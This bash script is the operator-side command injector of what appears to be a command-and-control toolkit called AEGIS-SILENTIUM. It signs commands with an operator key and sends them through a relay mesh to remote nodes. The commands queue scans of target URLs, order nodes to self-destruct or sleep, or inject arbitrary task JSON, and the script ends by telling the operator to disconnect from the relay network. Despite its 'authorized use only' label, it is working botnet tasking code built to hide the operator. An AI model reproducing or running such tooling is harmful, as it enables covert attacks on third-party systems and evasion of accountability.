#!/usr/bin/env bash
# ═══════════════════════════════════════════════════════════════════════════════
# AEGIS-SILENTIUM — Operator Command / Objective Injection
# Signs a command with the operator's private key and injects it into the
# relay mesh.  The Command Node does not need to remain online after injection.
#
# Supported commands:
#   scan      TARGET_URL      — Queue scan for a target
#   kill      NODE_ID         — Send kill/self-destruct to a specific node
#   kill_all  all             — Kill all active nodes
#   stop      all             — Emergency stop all relays
#   sleep     NODE_ID SECS    — Put node into deep sleep for N seconds
#   task      NODE_ID JSON    — Inject arbitrary task JSON
#
# Usage:
#   bash scripts/inject_objective.sh \
#       --key /path/to/operator_key.pem \
#       --relay https://relay1.example.com:443 \
#       --cmd scan --target https://example.com
#
# AUTHORIZED USE ONLY
# ═══════════════════════════════════════════════════════════════════════════════
set -euo pipefail

OPERATOR_KEY=""
RELAY_URL=""
CMD=""
NODE_ID="all"
TARGET=""
TASK_JSON=""
SLEEP_SECS=0

while [[ $# -gt 0 ]]; do
    case "$1" in
        --key)        OPERATOR_KEY="$2"; shift 2 ;;
        --relay)      RELAY_URL="$2";    shift 2 ;;
        --cmd)        CMD="$2";          shift 2 ;;
        --node)       NODE_ID="$2";      shift 2 ;;
        --target)     TARGET="$2";       shift 2 ;;
        --task-json)  TASK_JSON="$2";    shift 2 ;;
        --sleep-secs) SLEEP_SECS="$2";  shift 2 ;;
        --help)
            echo "Usage: $0 --key KEY.pem --relay URL --cmd CMD [options]"
            echo "Commands: scan | kill | kill_all | stop | sleep | task"
            exit 0
            ;;
        *) echo "Unknown: $1"; exit 1 ;;
    esac
done

[[ -z "${OPERATOR_KEY}" ]] && { echo "Error: --key required"; exit 1; }
[[ -z "${RELAY_URL}"    ]] && { echo "Error: --relay required"; exit 1; }
[[ -z "${CMD}"          ]] && { echo "Error: --cmd required"; exit 1; }
[[ ! -f "${OPERATOR_KEY}" ]] && { echo "Error: key file not found: ${OPERATOR_KEY}"; exit 1; }

command -v openssl &>/dev/null || { echo "Error: openssl required"; exit 1; }
command -v curl    &>/dev/null || { echo "Error: curl required"; exit 1; }

TIMESTAMP=$(date +%s)

# ── Build objective payload ───────────────────────────────────────────────────
case "${CMD}" in
    scan)
        [[ -z "${TARGET}" ]] && { echo "Error: --target required for scan"; exit 1; }
        PAYLOAD=$(printf '{"cmd":"scan","node_id":"%s","target":"%s","ts":%d}' \
            "${NODE_ID}" "${TARGET}" "${TIMESTAMP}")
        ;;
    kill)
        PAYLOAD=$(printf '{"cmd":"kill","node_id":"%s","ts":%d}' \
            "${NODE_ID}" "${TIMESTAMP}")
        ;;
    kill_all)
        PAYLOAD=$(printf '{"cmd":"kill_all","node_id":"all","ts":%d}' "${TIMESTAMP}")
        ;;
    stop)
        PAYLOAD=$(printf '{"cmd":"stop_relays","node_id":"all","ts":%d}' "${TIMESTAMP}")
        ;;
    sleep)
        [[ "${SLEEP_SECS}" -lt 1 ]] && { echo "Error: --sleep-secs required"; exit 1; }
        PAYLOAD=$(printf '{"cmd":"sleep","node_id":"%s","secs":%d,"ts":%d}' \
            "${NODE_ID}" "${SLEEP_SECS}" "${TIMESTAMP}")
        ;;
    task)
        [[ -z "${TASK_JSON}" ]] && { echo "Error: --task-json required"; exit 1; }
        PAYLOAD=$(printf '{"cmd":"task","node_id":"%s","task":%s,"ts":%d}' \
            "${NODE_ID}" "${TASK_JSON}" "${TIMESTAMP}")
        ;;
    *)
        echo "Unknown command: ${CMD}"
        exit 1
        ;;
esac

echo "Payload: ${PAYLOAD}"

# ── Sign with ECDSA P-256 ────────────────────────────────────────────────────
TMPDIR=$(mktemp -d)
trap "rm -rf ${TMPDIR}" EXIT

echo -n "${PAYLOAD}" > "${TMPDIR}/payload.bin"

# Hash the payload
openssl dgst -sha256 -binary "${TMPDIR}/payload.bin" > "${TMPDIR}/hash.bin"

# Sign with operator's ECDSA key (DER signature)
openssl dgst -sha256 -sign "${OPERATOR_KEY}" \
    "${TMPDIR}/payload.bin" > "${TMPDIR}/sig.der"

# Base64-encode signature
SIG_B64=$(base64 -w 0 "${TMPDIR}/sig.der")
PAYLOAD_B64=$(base64 -w 0 "${TMPDIR}/payload.bin")

# ── Build signed envelope ────────────────────────────────────────────────────
ENVELOPE=$(printf '{"payload":"%s","sig":"%s","ts":%d}' \
    "${PAYLOAD_B64}" "${SIG_B64}" "${TIMESTAMP}")

echo ""
echo "Signed envelope constructed."
echo "Injecting into relay: ${RELAY_URL}"

# ── POST to relay mesh endpoint ───────────────────────────────────────────────
# The relay verifies the operator signature and propagates to core
HTTP_CODE=$(curl -sk \
    -o "${TMPDIR}/response.json" \
    -w "%{http_code}" \
    -X POST \
    -H "Content-Type: application/json" \
    -H "X-Aegis-Objective: true" \
    --data-raw "${ENVELOPE}" \
    --max-time 15 \
    "${RELAY_URL}/api/objective" 2>&1)

echo "HTTP Status: ${HTTP_CODE}"
if [[ -s "${TMPDIR}/response.json" ]]; then
    echo "Response: $(cat ${TMPDIR}/response.json)"
fi

if [[ "${HTTP_CODE}" == "202" || "${HTTP_CODE}" == "200" ]]; then
    echo ""
    echo "✓ Objective injected successfully."
    echo "  Command: ${CMD}  |  Node: ${NODE_ID}"
    [[ -n "${TARGET}" ]] && echo "  Target: ${TARGET}"
else
    echo ""
    echo "✗ Injection failed (HTTP ${HTTP_CODE})"
    exit 1
fi

echo ""
echo "NOTE: Command Node connection complete. Disconnect from relay network now."
